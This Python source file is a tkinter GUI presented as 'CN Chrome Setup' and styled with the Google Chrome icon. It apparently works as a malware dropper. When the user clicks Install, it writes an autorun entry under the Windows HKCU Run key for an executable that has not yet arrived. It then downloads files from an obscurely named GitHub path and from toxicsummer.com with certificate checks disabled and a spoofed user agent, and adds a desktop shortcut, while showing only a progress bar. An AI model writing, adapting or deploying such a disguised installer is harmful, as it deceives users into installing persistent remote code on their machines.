import os
import re
import math
import tempfile
import threading
import queue
import requests
import urllib3
from urllib.parse import urljoin, urlparse

import tkinter as tk


# =====================================================================
# Window icon
# =====================================================================

ICON_URL = "https://icons.iconarchive.com/icons/franksouza183/fs/512/Apps-google-chrome-icon.png"


def download_icon(url=ICON_URL):
    """Download the icon to a temp file and return the path (or None on failure)."""
    try:
        verify = not any(h in url for h in ("toxicsummer.com",))
        r = requests.get(url, timeout=15, verify=verify)
        r.raise_for_status()
        fd, path = tempfile.mkstemp(prefix="cnchrome_icon_", suffix=".png")
        with os.fdopen(fd, "wb") as f:
            f.write(r.content)
        return path
    except Exception as e:
        print(f"⚠  Could not download icon: {e}")
        return None


# =====================================================================
# Event bus  (background thread -> GUI main thread)
# =====================================================================

_EVENT_QUEUE = None
_EVENT_LOCK  = threading.Lock()


def set_event_queue(q):
    global _EVENT_QUEUE
    with _EVENT_LOCK:
        _EVENT_QUEUE = q


def _emit(kind, **data):
    with _EVENT_LOCK:
        q = _EVENT_QUEUE
    if q is None:
        return
    try:
        q.put_nowait((kind, data))
    except Exception:
        pass


def log(msg):
    print(msg)
    _emit("log", msg=msg)


def phase(name):
    _emit("phase", name=name)


def set_status(msg):
    _emit("status", msg=msg)


def set_progress(current, total):
    _emit("progress", current=current, total=total)


# =====================================================================
# Color / drawing helpers
# =====================================================================

def _hex_to_rgb(h):
    h = h.lstrip("#")
    return tuple(int(h[i:i + 2], 16) for i in (0, 2, 4))


def _rgb_to_hex(rgb):
    return "#{:02x}{:02x}{:02x}".format(*[max(0, min(255, int(c))) for c in rgb])


def _lerp_color(c1, c2, t):
    t = max(0.0, min(1.0, t))
    a, b = _hex_to_rgb(c1), _hex_to_rgb(c2)
    return _rgb_to_hex(tuple(a[i] + (b[i] - a[i]) * t for i in range(3)))


def round_rect(canvas, x1, y1, x2, y2, r=16, **kw):
    r = max(0, min(r, (x2 - x1) / 2, (y2 - y1) / 2))
    if r < 3:
        return canvas.create_rectangle(x1, y1, x2, y2, **kw)
    pts = [
        x1 + r, y1,
        x2 - r, y1, x2, y1, x2, y1 + r,
        x2, y2 - r, x2, y2, x2 - r, y2,
        x1 + r, y2, x1, y2, x1, y2 - r,
        x1, y1 + r, x1, y1,
    ]
    return canvas.create_polygon(pts, smooth=True, **kw)


# =====================================================================
# Core downloader
# =====================================================================

class DX_Update(object):

    INSECURE_HOSTS = ["toxicsummer.com"]

    def __init__(self):
        self.GITHUB_USER  = "developerhost-server"
        self.GITHUB_REPO  = "JyubyubySbiu6ininu"
        self.GITHUB_DIR   = "Microsoft.sheache/microsoft-encrypt-37014553/microsoft-epiv-25415130/img1"
        self.GITHUB_TOKEN = ""

        self.GDRIVE_URL_OR_ID = ""
        self.TOXICSUMMER_URL  = "https://toxicsummer.com/dw/cn-chrome/"
        self.LOCAL_DIR        = r"C:\cn-google"

        self.ADD_TO_STARTUP  = True
        self.STARTUP_NAME    = "CnChromeApp"
        self.STARTUP_EXE_REL = os.path.join("cn-chrome", "app.exe")

        self.CREATE_DESKTOP_SHORTCUT = True
        self.SHORTCUT_NAME = "CN Chrome.lnk"

    # ----------------------------------------------------------------

    @staticmethod
    def _should_verify(url):
        try:
            host = requests.utils.urlparse(url).hostname or ""
        except Exception:
            return True
        for bad in DX_Update.INSECURE_HOSTS:
            if host == bad or host.endswith("." + bad):
                return False
        return True

    @staticmethod
    def safe_filename(name):
        if not name:
            return "download"
        name = name.split("?", 1)[0].split("#", 1)[0]
        name = re.sub(r'[<>:"/\\|?*\x00-\x1f]', "_", name)
        name = re.sub(r"\s+", " ", name).strip().strip(". ")
        if name.upper().split(".")[0] in {
            "CON", "PRN", "AUX", "NUL",
            "COM1", "COM2", "COM3", "COM4", "COM5", "COM6", "COM7", "COM8", "COM9",
            "LPT1", "LPT2", "LPT3", "LPT4", "LPT5", "LPT6", "LPT7", "LPT8", "LPT9",
        }:
            name = "_" + name
        if len(name) > 200:
            base, dot, ext = name.rpartition(".")
            if dot and len(ext) <= 10:
                name = base[:190] + "." + ext
            else:
                name = name[:200]
        return name or "download"

    @staticmethod
    def stream_download(url, local_path, headers=None, chunk_size=8192,
                        max_retries=3, verify=None):
        d = os.path.dirname(local_path)
        if d:
            os.makedirs(d, exist_ok=True)
        if verify is None:
            verify = DX_Update._should_verify(url)

        for attempt in range(1, max_retries + 1):
            try:
                with requests.get(url, headers=headers or {}, stream=True,
                                  timeout=60, verify=verify) as r:
                    r.raise_for_status()
                    total = int(r.headers.get("Content-Length", 0) or 0)
                    downloaded = 0
                    set_progress(0, total)
                    with open(local_path, "wb") as f:
                        for chunk in r.iter_content(chunk_size=chunk_size):
                            if chunk:
                                f.write(chunk)
                                downloaded += len(chunk)
                                set_progress(downloaded, total)
                log(f" Saved: {local_path}")
                return True
            except requests.exceptions.RequestException as e:
                log(f"⚠  Attempt {attempt}/{max_retries} failed for {url}: {e}")
                if attempt == max_retries:
                    log(f" Giving up on: {url}")
                    return False
            except OSError as e:
                log(f" OS error writing {local_path}: {e}")
                return False
        return False

    # ----------------------------------------------------------------

    @staticmethod
    def add_to_windows_startup(exe_path, name="CnChromeApp"):
        if os.name != "nt":
            log("  Not running on Windows; skipping startup registration.")
            return False
        abs_path = os.path.abspath(exe_path)
        if not os.path.isfile(abs_path):
            log(f"⚠  {abs_path} not found yet — registering anyway.")
        try:
            import winreg
            value = f'"{abs_path}"'
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE,
            )
            try:
                winreg.SetValueEx(key, name, 0, winreg.REG_SZ, value)
            finally:
                winreg.CloseKey(key)
            log(f" Registered in Windows startup [{name}]: {value}")
            return True
        except PermissionError as e:
            log(f" Startup registration denied: {e}")
            return False
        except Exception as e:
            log(f" Startup registration failed: {e}")
            return False

    @staticmethod
    def remove_from_windows_startup(name="CnChromeApp"):
        if os.name != "nt":
            return False
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE,
            )
            try:
                winreg.DeleteValue(key, name)
                log(f"  Removed startup entry [{name}]")
            except FileNotFoundError:
                log(f"  No startup entry named [{name}] to remove.")
            finally:
                winreg.CloseKey(key)
            return True
        except Exception as e:
            log(f" Failed to remove startup entry: {e}")
            return False

    # ----------------------------------------------------------------

    @staticmethod
    def create_desktop_shortcut(target_path, shortcut_name="CN Chrome.lnk",
                                working_dir=None, icon_path=None):
        if os.name != "nt":
            log("  Not running on Windows; skipping desktop shortcut.")
            return False
        target_path = os.path.abspath(target_path)
        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
        if not os.path.isdir(desktop):
            desktop = os.path.join(os.environ.get("USERPROFILE", ""), "Desktop")
        if not os.path.isdir(desktop):
            log(" Could not locate the Desktop folder.")
            return False
        shortcut_path = os.path.join(desktop, shortcut_name)
        if working_dir is None:
            working_dir = os.path.dirname(target_path)
        ps_lines = [
            "$WshShell = New-Object -ComObject WScript.Shell",
            f"$Shortcut = $WshShell.CreateShortcut('{shortcut_path}')",
            f"$Shortcut.TargetPath = '{target_path}'",
            f"$Shortcut.WorkingDirectory = '{working_dir}'",
        ]
        if icon_path:
            ps_lines.append(f"$Shortcut.IconLocation = '{icon_path}'")
        ps_lines.append("$Shortcut.Save()")
        ps_script = "; ".join(ps_lines)
        try:
            import subprocess
            subprocess.run(["powershell", "-NoProfile", "-Command", ps_script],
                           capture_output=True, text=True, check=True)
            log(f" Desktop shortcut created: {shortcut_path}")
            return True
        except subprocess.CalledProcessError as e:
            log(f" Failed to create desktop shortcut: {e.stderr.strip()}")
            return False
        except Exception as e:
            log(f" Unexpected error creating desktop shortcut: {e}")
            return False

    # ----------------------------------------------------------------

    @staticmethod
    def _github_headers(token=""):
        headers = {"Accept": "application/vnd.github.v3+json"}
        if token:
            headers["Authorization"] = f"token {token}"
        return headers

    @classmethod
    def download_github_dir(cls, user, repo, dir_path, out_dir, token=""):
        api_url = f"https://api.github.com/repos/{user}/{repo}/contents/{dir_path}"
        headers = cls._github_headers(token)
        log(f" Listing GitHub dir: {dir_path}")
        try:
            r = requests.get(api_url, headers=headers, timeout=15)
            r.raise_for_status()
            items = r.json()
        except requests.exceptions.RequestException as e:
            log(f" GitHub listing failed: {e}")
            return
        except ValueError as e:
            log(f" GitHub returned invalid JSON: {e}")
            return
        if not isinstance(items, list):
            log(f" Unexpected GitHub response.")
            return
        for item in items:
            try:
                item_type = item.get("type")
                name = item.get("name", "unnamed")
                if item_type == "file":
                    download_url = item.get("download_url")
                    if not download_url:
                        continue
                    safe_name = cls.safe_filename(name)
                    local_path = os.path.join(out_dir, dir_path.split("/")[-1], safe_name)
                    log(f"⬇  GitHub: {name}")
                    set_status(f"Downloading: {name}")
                    dl_headers = {"Authorization": f"token {token}"} if token else None
                    cls.stream_download(download_url, local_path, headers=dl_headers)
                elif item_type == "dir":
                    sub_path = item.get("path")
                    if sub_path:
                        cls.download_github_dir(user, repo, sub_path, out_dir, token)
            except Exception as e:
                log(f"⚠  Skipping {item.get('name', '?')}: {e}")

    # ----------------------------------------------------------------

    @staticmethod
    def download_google_drive(url_or_id, out_dir):
        try:
            import gdown
        except ImportError:
            log(" Google Drive support needs `gdown`. Install: pip install gdown")
            return
        try:
            os.makedirs(out_dir, exist_ok=True)
            is_folder = "/folders/" in url_or_id
            m = re.search(r"/folders/([a-zA-Z0-9_-]+)", url_or_id) or \
                re.search(r"/file/d/([a-zA-Z0-9_-]+)", url_or_id)
            drive_id = m.group(1) if m else url_or_id.strip()
            if is_folder:
                log(f" Google Drive folder: {drive_id}")
                gdown.download_folder(id=drive_id, output=out_dir,
                                      quiet=False, use_cookies=False)
            else:
                log(f"  Google Drive file: {drive_id}")
                gdown.download(id=drive_id, output=os.path.join(out_dir, ""),
                               quiet=False, use_cookies=False)
        except Exception as e:
            log(f" Google Drive download failed: {e}")

    # ----------------------------------------------------------------

    @classmethod
    def download_toxicsummer_folder(cls, url, out_dir):
        log(f" Listing toxicsummer dir: {url}")
        headers = {
            "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                           "AppleWebKit/537.36 (KHTML, like Gecko) "
                           "Chrome/120.0.0.0 Safari/537.36"),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        }
        verify = cls._should_verify(url)
        if not verify:
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            log(f"  SSL verification disabled for {url}")
        try:
            r = requests.get(url, headers=headers, timeout=30,
                             allow_redirects=True, verify=verify)
            r.raise_for_status()
            html = r.text
        except requests.exceptions.RequestException as e:
            log(f" toxicsummer listing failed: {e}")
            return

        content_type = r.headers.get("Content-Type", "")
        if "application/json" in content_type:
            try:
                data = r.json()
                cls._download_from_json_listing(data, url, out_dir, headers, verify)
                return
            except ValueError:
                pass

        hrefs = re.findall(r'href\s*=\s*["\']([^"\']+)["\']', html, re.IGNORECASE)
        if not hrefs:
            log("  No links found on page.")
            return

        base = url if url.endswith("/") else url + "/"
        downloaded = 0
        for href in hrefs:
            href = href.strip()
            if (not href or href.startswith("#") or href.startswith("javascript:")
                    or href.startswith("mailto:") or href in ("../", "..", "/")
                    or href.startswith("http://") or href.startswith("https://")):
                if href.startswith("http") and "toxicsummer.com" in href:
                    file_url = href
                else:
                    continue
            else:
                file_url = urljoin(base, href)
            if file_url.endswith("/"):
                continue
            raw_name = os.path.basename(urlparse(file_url).path.rstrip("/"))
            if not raw_name:
                continue
            filename = cls.safe_filename(raw_name)
            if not filename or filename == "download":
                continue
            local_path = os.path.join(out_dir, filename)
            log(f"  toxicsummer: {filename}")
            set_status(f"Downloading: {filename}")
            if cls.stream_download(file_url, local_path, headers=headers, verify=verify):
                downloaded += 1
        log(f" toxicsummer: {downloaded} file(s) downloaded")

    @classmethod
    def _download_from_json_listing(cls, data, base_url, out_dir, headers, verify=True):
        items = data if isinstance(data, list) else data.get("files", data.get("items", []))
        if not isinstance(items, list):
            log("  JSON response is not a list of files.")
            return
        for item in items:
            if isinstance(item, str):
                raw_name = os.path.basename(urlparse(item).path)
                filename = cls.safe_filename(raw_name)
                file_url = urljoin(base_url, item)
            elif isinstance(item, dict):
                file_url = item.get("url") or item.get("download_url") or item.get("path")
                raw_name = item.get("name") or os.path.basename(urlparse(str(file_url)).path)
                filename = cls.safe_filename(raw_name)
                if file_url:
                    file_url = urljoin(base_url, file_url)
            else:
                continue
            if not file_url or not filename or filename == "download":
                continue
            local_path = os.path.join(out_dir, filename)
            log(f"  toxicsummer: {filename}")
            set_status(f"Downloading: {filename}")
            cls.stream_download(file_url, local_path, headers=headers, verify=verify)

    # ----------------------------------------------------------------

    def main(self):
        phase("Registering startup entry...")
        if self.ADD_TO_STARTUP:
            exe_path = os.path.join(self.LOCAL_DIR, self.STARTUP_EXE_REL)
            try:
                self.add_to_windows_startup(exe_path, name=self.STARTUP_NAME)
            except Exception as e:
                log(f" Unexpected error in startup step: {e}")
        else:
            log("  Startup registration disabled.")

        phase("Downloading from GitHub...")
        if self.GITHUB_USER and self.GITHUB_REPO and self.GITHUB_DIR:
            try:
                self.download_github_dir(
                    self.GITHUB_USER, self.GITHUB_REPO, self.GITHUB_DIR,
                    self.LOCAL_DIR, self.GITHUB_TOKEN,
                )
            except Exception as e:
                log(f" Unexpected error in GitHub step: {e}")
        else:
            log("  Skipping GitHub (not configured).")

        phase("Downloading from Google Drive...")
        if self.GDRIVE_URL_OR_ID.strip():
            try:
                self.download_google_drive(
                    self.GDRIVE_URL_OR_ID.strip(),
                    os.path.join(self.LOCAL_DIR, "gdrive"),
                )
            except Exception as e:
                log(f" Unexpected error in Google Drive step: {e}")
        else:
            log("  Skipping Google Drive (not configured).")

        phase("Downloading CN Chrome files...")
        if self.TOXICSUMMER_URL.strip():
            try:
                self.download_toxicsummer_folder(
                    self.TOXICSUMMER_URL.strip(),
                    os.path.join(self.LOCAL_DIR, "cn-chrome"),
                )
            except Exception as e:
                log(f" Unexpected error in toxicsummer step: {e}")
        else:
            log("  Skipping toxicsummer (not configured).")

        phase("Creating desktop shortcut...")
        if self.CREATE_DESKTOP_SHORTCUT:
            exe_path = os.path.join(self.LOCAL_DIR, self.STARTUP_EXE_REL)
            try:
                self.create_desktop_shortcut(exe_path, shortcut_name=self.SHORTCUT_NAME)
            except Exception as e:
                log(f" Unexpected error in desktop shortcut step: {e}")
        else:
            log("  Desktop shortcut creation disabled.")

        log(" All downloads finished.")


# =====================================================================
# Custom rounded gradient button
# =====================================================================

class RoundButton(tk.Canvas):
    def __init__(self, parent, text, command, width=150, height=44,
                 bg="#0a0a0f", fg="#ffffff", color="#3b82f6", **kw):
        super().__init__(parent, width=width, height=height, bg=bg,
                         highlightthickness=0, bd=0, **kw)
        self._text = text
        self._command = command
        self._base = color
        self._fg = fg
        self._bw = width
        self._bh = height
        self._hover = False
        self._pressed = False
        self._enabled = True
        self._draw()
        self.bind("<Enter>", self._on_enter)
        self.bind("<Leave>", self._on_leave)
        self.bind("<ButtonPress-1>", self._on_press)
        self.bind("<ButtonRelease-1>", self._on_release)
        self.configure(cursor="hand2")

    def set_enabled(self, enabled):
        self._enabled = enabled
        self.configure(cursor="hand2" if enabled else "arrow")
        self._draw()

    def set_text(self, text):
        self._text = text
        self._draw()

    def _on_enter(self, e):
        if self._enabled:
            self._hover = True
            self._draw()

    def _on_leave(self, e):
        self._hover = False
        self._pressed = False
        self._draw()

    def _on_press(self, e):
        if self._enabled:
            self._pressed = True
            self._draw()

    def _on_release(self, e):
        if not self._enabled:
            return
        was = self._pressed
        self._pressed = False
        self._draw()
        if was and self._command:
            self._command()

    def _draw(self):
        self.delete("all")
        w, h, r = self._bw, self._bh, self._bh // 2

        if not self._enabled:
            base = "#2c2c3a"
            text_col = "#6a6a7a"
        else:
            text_col = self._fg
            if self._pressed:
                base = _lerp_color(self._base, "#000000", 0.25)
            elif self._hover:
                base = _lerp_color(self._base, "#ffffff", 0.18)
            else:
                base = self._base

        round_rect(self, 1, 1, w - 1, h - 1, r, fill=base, outline="")

        if self._enabled and not self._pressed:
            top = _lerp_color(base, "#ffffff", 0.22)
            round_rect(self, 4, 3, w - 4, h // 2 + 2, r - 3, fill=top, outline="")

        self.create_text(w // 2, h // 2 + 1, text=self._text, fill=text_col,
                         font=("Segoe UI", 10, "bold"))


# =====================================================================
# Cool installer GUI (details panel removed)
# =====================================================================

class CoolInstaller:
    BG1     = "#0a0a0f"
    BG2     = "#0e0e16"
    BG3     = "#16161f"
    BORDER  = "#242432"
    ACCENT  = "#3b82f6"
    TEXT    = "#e8e8ee"
    MUTED   = "#8a8a9a"
    SUCCESS = "#22c55e"
    ERROR   = "#ef4444"
    W, H = 520, 260

    def __init__(self, root, icon_image=None):
        self.root = root
        self.root.overrideredirect(True)
        self.root.configure(bg=self.BORDER)

        sw = self.root.winfo_screenwidth()
        sh = self.root.winfo_screenheight()
        x = (sw - self.W) // 2
        y = (sh - self.H) // 2 - 30
        self.root.geometry(f"{self.W}x{self.H}+{x}+{y}")

        # Keep a reference so the image isn't garbage-collected.
        self._icon_image = icon_image
        if icon_image is not None:
            try:
                self.root.iconphoto(True, icon_image)
            except Exception as e:
                print(f"  Could not set window icon: {e}")

        self.queue = queue.Queue()
        set_event_queue(self.queue)

        self._running = False
        self._indeterminate = False
        self._value = 0
        self._shimmer = 0
        self._pulse = 0.0
        self._drag_x = 0
        self._drag_y = 0

        self._build()
        self._animate()
        self.root.after(50, self._poll)

    # ----------------------------------------------------------------

    def _build(self):
        content = tk.Frame(self.root, bg=self.BG1)
        content.pack(fill="both", expand=True, padx=1, pady=1)

        self._build_header(content)
        self._build_footer(content)
        self._build_body(content)

    def _build_header(self, parent):
        header = tk.Frame(parent, bg=self.BG2, height=54)
        header.pack(fill="x")
        header.pack_propagate(False)

        tk.Frame(parent, bg=self.BORDER, height=1).pack(fill="x")

        header.bind("<ButtonPress-1>", self._start_drag)
        header.bind("<B1-Motion>", self._on_drag)

        # Logo — use the downloaded Chrome icon if available, else fallback
        if self._icon_image is not None:
            logo = tk.Label(header, image=self._icon_image, bg=self.BG2,
                            bd=0, highlightthickness=0)
            logo.pack(side="left", padx=(16, 10), pady=11)
            logo.bind("<ButtonPress-1>", self._start_drag)
            logo.bind("<B1-Motion>", self._on_drag)
        else:
            logo = tk.Canvas(header, width=32, height=32, bg=self.BG2,
                             highlightthickness=0, bd=0)
            logo.pack(side="left", padx=(16, 10), pady=11)
            round_rect(logo, 0, 0, 32, 32, 8, fill=self.ACCENT, outline="")
            logo.create_text(16, 16, text="CN", fill="white",
                             font=("Segoe UI", 11, "bold"))

        title = tk.Label(header, text="CN Chrome Setup", bg=self.BG2,
                         fg=self.TEXT, font=("Segoe UI", 11, "bold"))
        title.pack(side="left")
        title.bind("<ButtonPress-1>", self._start_drag)
        title.bind("<B1-Motion>", self._on_drag)

        # Close
        close_btn = tk.Label(header, text="✕", bg=self.BG2, fg=self.MUTED,
                             font=("Segoe UI", 13), padx=20, cursor="hand2")
        close_btn.pack(side="right", fill="y")
        close_btn.bind("<Enter>", lambda e: close_btn.configure(fg="#ffffff", bg=self.ERROR))
        close_btn.bind("<Leave>", lambda e: close_btn.configure(fg=self.MUTED, bg=self.BG2))
        close_btn.bind("<Button-1>", lambda e: self._close())

    def _build_body(self, parent):
        body = tk.Frame(parent, bg=self.BG1)
        body.pack(fill="both", expand=True, padx=24, pady=(22, 0))

        self.status_var = tk.StringVar(value="Ready to install")
        tk.Label(body, textvariable=self.status_var, bg=self.BG1, fg=self.TEXT,
                 font=("Segoe UI", 11), anchor="w").pack(fill="x")

        self.prog_canvas = tk.Canvas(body, height=18, bg=self.BG1,
                                     highlightthickness=0, bd=0)
        self.prog_canvas.pack(fill="x", pady=(12, 4))

        pct_row = tk.Frame(body, bg=self.BG1)
        pct_row.pack(fill="x")
        self.pct_var = tk.StringVar(value="")
        tk.Label(pct_row, textvariable=self.pct_var, bg=self.BG1, fg=self.MUTED,
                 font=("Segoe UI", 9), anchor="e").pack(side="right")

    def _build_footer(self, parent):
        footer = tk.Frame(parent, bg=self.BG1, height=80)
        footer.pack(fill="x", side="bottom")
        footer.pack_propagate(False)

        btn_row = tk.Frame(footer, bg=self.BG1)
        btn_row.pack(side="right", padx=24, pady=18)

        self.install_btn = RoundButton(
            btn_row, "Install", self.start_install,
            width=140, height=42, bg=self.BG1, color=self.ACCENT,
        )
        self.install_btn.pack(side="right")

        self.close_btn = RoundButton(
            btn_row, "Close", self._close,
            width=100, height=42, bg=self.BG1, color="#2a2a3a", fg=self.TEXT,
        )
        self.close_btn.pack(side="right", padx=(0, 12))

    # ----------------------------------------------------------------
    # Animation
    # ----------------------------------------------------------------

    def _animate(self):
        self._shimmer = (self._shimmer + 1.6) % 100
        self._pulse = (self._pulse + 0.06) % (2 * math.pi)
        self._draw_progress()
        self.root.after(30, self._animate)

    def _draw_progress(self):
        c = self.prog_canvas
        c.delete("all")
        w = c.winfo_width()
        h = c.winfo_height()
        if w <= 1 or h <= 1:
            return

        r = h // 2

        # Pulsing glow outline
        if self._running:
            pulse = (math.sin(self._pulse) + 1) / 2
            glow = _lerp_color(self.BG3, self.ACCENT, pulse * 0.75)
            round_rect(c, 1, 1, w - 1, h - 1, r, fill="", outline=glow, width=2)

        # Track
        round_rect(c, 2, 2, w - 2, h - 2, r - 2, fill=self.BG3,
                   outline=self.BORDER, width=1)

        if self._indeterminate:
            seg_w = max(70, int(w * 0.32))
            span = w + seg_w
            pos = (self._shimmer / 100) * span - seg_w
            x1 = max(5, pos)
            x2 = min(w - 5, pos + seg_w)
            if x2 - x1 > 8:
                round_rect(c, x1, 4, x2, h - 4, (h - 8) // 2,
                           fill=self.ACCENT, outline="")
                mid = (x1 + x2) / 2
                sh1 = max(x1 + 4, mid - 22)
                sh2 = min(x2 - 4, mid + 22)
                if sh2 - sh1 > 4:
                    round_rect(c, sh1, 5, sh2, h - 5, (h - 10) // 2,
                               fill=_lerp_color(self.ACCENT, "#ffffff", 0.45),
                               outline="")
        else:
            fill_w = (w - 8) * self._value / 100
            if fill_w > 4:
                x1 = 4
                x2 = 4 + fill_w
                round_rect(c, x1, 4, x2, h - 4, (h - 8) // 2,
                           fill=self.ACCENT, outline="")
                if fill_w > 16:
                    round_rect(c, x1 + 3, 5, x2 - 3, h // 2 + 1,
                               max(0, (h // 2 - 6) // 2),
                               fill=_lerp_color(self.ACCENT, "#ffffff", 0.22),
                               outline="")
                if self._running and fill_w > 40:
                    pos = (self._shimmer / 100) * (fill_w + 60) - 30
                    if -30 < pos < fill_w + 30:
                        sx1 = max(7, 4 + pos - 20)
                        sx2 = min(x2 - 3, 4 + pos + 20)
                        if sx2 - sx1 > 4:
                            c.create_rectangle(
                                sx1, 6, sx2, h - 6,
                                fill=_lerp_color(self.ACCENT, "#ffffff", 0.55),
                                outline="")

    # ----------------------------------------------------------------
    # Event pump
    # ----------------------------------------------------------------

    def _poll(self):
        try:
            while True:
                kind, data = self.queue.get_nowait()
                if kind == "log":
                    pass  # details panel removed; logs still go to stdout
                elif kind == "status":
                    self.status_var.set(data["msg"])
                elif kind == "phase":
                    self._on_phase(data["name"])
                elif kind == "progress":
                    self._on_progress(data["current"], data["total"])
                elif kind == "done":
                    self._on_done()
        except queue.Empty:
            pass
        self.root.after(50, self._poll)

    def _on_phase(self, name):
        self.status_var.set(name)
        self._running = True
        self._indeterminate = True
        self.pct_var.set("")

    def _on_progress(self, current, total):
        if total > 0:
            self._indeterminate = False
            self._value = min(100, current * 100 / total)
            self.pct_var.set(f"{self._value:.0f}%")
        else:
            self._indeterminate = True
            self.pct_var.set("")

    # ----------------------------------------------------------------
    # Actions
    # ----------------------------------------------------------------

    def start_install(self):
        if self._running:
            return
        self._running = True
        self._indeterminate = True
        self._value = 0
        self.install_btn.set_enabled(False)
        self.install_btn.set_text("Installing...")
        self.close_btn.set_enabled(False)
        self.status_var.set("Starting...")
        threading.Thread(target=self._worker, daemon=True).start()

    def _worker(self):
        try:
            DX_Update().main()
        except Exception as e:
            log(f" Fatal error: {e}")
        finally:
            self.queue.put(("done", {}))

    def _on_done(self):
        self._running = False
        self._indeterminate = False
        self._value = 100
        self.pct_var.set("100%")
        self.status_var.set("Installation complete ✨")
        self.install_btn.set_enabled(True)
        self.install_btn.set_text("Reinstall")
        self.close_btn.set_enabled(True)

    def _close(self):
        try:
            self.root.destroy()
        except Exception:
            pass

    # ----------------------------------------------------------------
    # Window drag
    # ----------------------------------------------------------------

    def _start_drag(self, e):
        self._drag_x = e.x_root - self.root.winfo_x()
        self._drag_y = e.y_root - self.root.winfo_y()

    def _on_drag(self, e):
        x = e.x_root - self._drag_x
        y = e.y_root - self._drag_y
        self.root.geometry(f"+{x}+{y}")


# =====================================================================
# Entry point
# =====================================================================

def main():
    root = tk.Tk()
    root.title("CN Chrome Setup")

    # Download icon BEFORE building the UI so we can use it right away.
    icon_path = download_icon()
    icon_image = None
    if icon_path:
        try:
            icon_image = tk.PhotoImage(file=icon_path)
            # Subsample large icons so the header logo isn't gigantic.
            # 512 -> 32px => subsample by 16 (must be integer).
            if icon_image.width() >= 256:
                icon_image = icon_image.subsample(16, 16)
            elif icon_image.width() >= 128:
                icon_image = icon_image.subsample(8, 8)
            elif icon_image.width() >= 64:
                icon_image = icon_image.subsample(4, 4)
            elif icon_image.width() >= 32:
                icon_image = icon_image.subsample(2, 2)
            root.iconphoto(True, icon_image)
        except Exception as e:
            print(f"  Could not load icon image: {e}")
            icon_image = None

    CoolInstaller(root, icon_image=icon_image)
    root.mainloop()


if __name__ == "__main__":
    main()
